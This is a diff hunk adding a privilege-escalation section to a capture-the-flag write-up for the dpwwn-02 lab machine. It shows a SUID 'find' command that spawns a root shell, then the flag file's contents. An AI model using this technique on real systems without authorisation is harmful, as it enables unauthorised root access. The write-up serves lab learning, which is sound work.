@@ -208,8 +208,29 @@ we see find here and can use it to get root account
 
 ## 3.Privilege Escalation
 
+Just use the command below to get root :
 
+```bash
+$ find . -exec /bin/sh -p \; -quit
 
+cd /root
+
+cat dpwwn-02-FLAG.txt
+
+Congratulation! You PWN this dpwwn-02. Hope you enjoy this boot to root CTF.
+Thank you. 
+
+46617323 
+24337873 
+4b4d6f6f 
+72643234 
+40323564 
+4e443462 
+36312a23 
+26724a6d
+```
+
+This is how you can get root on this machine :)
 
 
 
